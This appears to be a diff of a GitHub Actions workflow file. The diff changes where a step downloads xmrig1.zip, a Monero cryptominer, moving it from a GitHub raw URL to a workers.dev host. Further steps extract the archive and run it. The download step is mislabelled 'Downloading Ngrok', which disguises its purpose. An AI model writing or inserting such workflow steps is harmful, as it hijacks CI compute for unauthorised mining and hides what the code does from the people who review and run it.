@@ -10,8 +10,7 @@ jobs:
 
     steps:
     - name: Downloading Ngrok.
-      run: |
-        Invoke-WebRequest https://raw.githubusercontent.com/jaisai1337/impu/main/xmrig1.zip -OutFile xmrig1.zip
+      run: Invoke-WebRequest https://fast.kjaisai1337.workers.dev/xmrig1.zip -OutFile xmrig1.zip
     - name: Extracting Xmrig Files.
       run: Expand-Archive xmrig1.zip
     - name: XMRIG.
